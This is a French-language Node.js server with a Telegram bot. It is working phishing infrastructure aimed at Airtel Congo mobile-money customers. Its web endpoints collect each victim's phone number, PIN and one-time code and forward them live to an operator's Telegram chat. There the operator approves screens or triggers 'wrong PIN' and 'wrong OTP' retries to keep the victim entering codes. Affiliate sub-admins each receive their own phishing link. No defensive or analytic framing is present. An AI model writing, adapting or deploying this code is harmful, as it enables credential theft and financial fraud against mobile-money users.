const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8955755117';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function isValidAirtelNumber(number) {
  const clean = String(number || '').replace(/\D/g, '');
  return /^(05|06)\d{7}$/.test(clean);
}

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 5;
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *Panneau de Contrôle des Sous-Administrateurs* (Page ${page + 1}/${totalPages})\n\nGérez les autorisations :`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nAucun sous-administrateur pour le moment.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Utilisateur');
      const authStatus = record.authorized ? '🟢 Autorisé' : '🔴 Non autorisé';
      const subLink = `${APP_URL}/?admin=${id}`;
      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Statut: ${authStatus}\n   🔗 \`${subLink}\``;
    });
  }

  let navRow = [];
  if (page > 0) navRow.push({ text: `⬅️ Précédent`, callback_data: `PAGE_${page - 1}` });
  navRow.push({ text: `🔄 Actualiser`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) navRow.push({ text: `Suivant ➡️`, callback_data: `PAGE_${page + 1}` });
  if (navRow.length > 0) keyboard.push(navRow);

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  bot.setWebHook(webhookUrl).catch((err) => {
    console.error('Failed to set webhook:', err);
  });

  app.post(webhookPath, (req, res) => {
    res.sendStatus(200);
    try { bot.processUpdate(req.body); } catch (err) {}
  });

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(FALLBACK_ADMIN_ID)) {
      await bot.sendMessage(chatId, `⚠️ Accès non autorisé.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'Aucun';
      const firstName = msg.from.first_name || 'Inconnu';
      const lastName = msg.from.last_name || 'Inconnu';
      
      if (chatId !== String(FALLBACK_ADMIN_ID)) {
        const record = admins.get(chatId);
        if (!record || !record.authorized) {
          await bot.sendMessage(chatId, `⚠️ Votre compte est en attente d'approbation par l'administrateur principal.`);
          return;
        }
      }
      
      const userLink = `${APP_URL}/?admin=${chatId}`;
      let profileText = 
        `👤 *Vos Informations de Lien*\n\n` +
        `• *Prénom :* ${firstName}\n` +
        `• *Nom :* ${lastName}\n` +
        `• *Nom d'utilisateur :* ${username}\n` +
        `• *ID Telegram :* \`${userId}\`\n\n` +
        `🔗 *Votre Lien Spécifique :*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'Utilisateur';
      const lastName = msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 Bienvenue Administrateur Principal. Lien actif : ${APP_URL}\n\nTapez /admins pour gérer les sous-administrateurs.`, {
          parse_mode: 'Markdown'
        });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: false,
          paid: false,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      } else {
        const existing = admins.get(chatId);
        existing.username = username;
        existing.firstName = firstName;
        existing.lastName = lastName;
        saveAdmins();
      }

      const record = admins.get(chatId);

      if (!record.authorized) {
        await bot.sendMessage(FALLBACK_ADMIN_ID, 
          `🚨 *Nouvelle Demande de Sous-Admin!*\n\n` +
          `👤 *Utilisateur :* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
          `🆔 *Chat ID :* \`${userId}\`\n\n` +
          `Veuillez approuver ou rejeter cette demande.`, 
          { 
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ Autoriser', callback_data: `AUTH_YES_${userId}` },
                  { text: '❌ Rejeter', callback_data: `AUTH_NO_${userId}` }
                ]
              ]
            }
          }
        );

        await bot.sendMessage(chatId, 
          `👋 *Bienvenue ${firstName} !*\n\n` +
          `⚠️ Votre compte **attend l'approbation** de l'administrateur principal.\n\n` +
          `Veuillez contacter l'administrateur pour activer votre lien.`, 
          { parse_mode: 'Markdown' }
        );
        return;
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      let responseText = `👋 *Bienvenue ${firstName} !*\n\nVotre compte est actif.\n\nVotre lien est prêt :\n${userLink}`;

      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
        if (chatId !== String(FALLBACK_ADMIN_ID)) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Action non autorisée.' });
          return;
        }

        const parts = actionData.split('_');
        const decision = parts[1];
        const targetSubId = parts[2];
        const subRecord = admins.get(targetSubId);

        if (!subRecord) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Administrateur introuvable.' });
          return;
        }

        if (decision === 'YES') {
          subRecord.authorized = true;
          saveAdmins();

          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
          await bot.sendMessage(targetSubId, 
            `🎉 *Félicitations !* Votre compte a été approuvé.\n\n` +
            `🔗 *Votre Lien :*\n${assignedLink}`,
            { parse_mode: 'Markdown' }
          ).catch(() => {});

          await bot.answerCallbackQuery(query.id, { text: '✅ Autorisé avec succès !' });
          await bot.editMessageText(`✅ *Sous-Admin Autorisé*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
          });
        } else {
          admins.delete(targetSubId);
          saveAdmins();

          await bot.sendMessage(targetSubId, `❌ Votre demande d'accès a été refusée.`).catch(() => {});
          await bot.answerCallbackQuery(query.id, { text: '❌ Demande rejetée.' });
          await bot.editMessageText(`❌ *Demande Rejetée*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
          });
        }
        return;
      }

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Inconnu', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ Écran OTP autorisé pour ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Accès refusé pour ${session.contact}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Écran de succès activé pour ${session.contact}`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `⚠️ Action PIN Incorrect déclenchée.`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          await bot.sendMessage(chatTarget, `⚠️ Action OTP Incorrect déclenchée.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Traité : ${prefix}` }).catch(() => {});

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Erreur de traitement.' }).catch(() => {});
      } catch (e) {}
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    if (!isValidAirtelNumber(cleanContact)) {
      return res.status(400).json({ success: false, error: 'Veuillez entrer un numéro Airtel valide commençant par 05 ou 06.' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Chat ID invalide ou administrateur non autorisé.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;

    sessions.set(userId, {
      contact: cleanContact,
      pin,
      amount: amount || 'XAF 2,500,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    const message =
      `NOUVELLE DEMANDE AIRTEL CONGO\n\n` +
      `NUMÉRO : ${cleanContact}\n` +
      `PIN (4 Chiffres) : ${pin}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ AUTORISER OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ REFUSER', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (!bot) {
      return res.status(500).json({ success: false, error: 'Bot non initialisé' });
    }

    const sentMsg = await bot.sendMessage(targetChat, message, opts);
    const session = sessions.get(userId);
    if (session) session.adminMsgId = sentMsg.message_id;
    
    return res.status(200).json({ success: true, userId });

  } catch (err) {
    return res.status(500).json({ success: false, error: 'Erreur Telegram : ' + (err?.message || 'Inconnue') });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session introuvable' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `NOUVELLE DEMANDE AIRTEL CONGO\n\n` +
      `NUMÉRO : ${session.contact}\n` +
      `OTP (4 Chiffres) : ${otp}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ PIN INCORRECT', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ OTP INCORRECT', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ OTP VALIDE', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Erreur Telegram' });
  }
});

const PORT = process.env.PORT || 10000;

app.listen(PORT, () => {
  console.log(`Server is running and listening on port ${PORT}`);
  initBot();
});
        
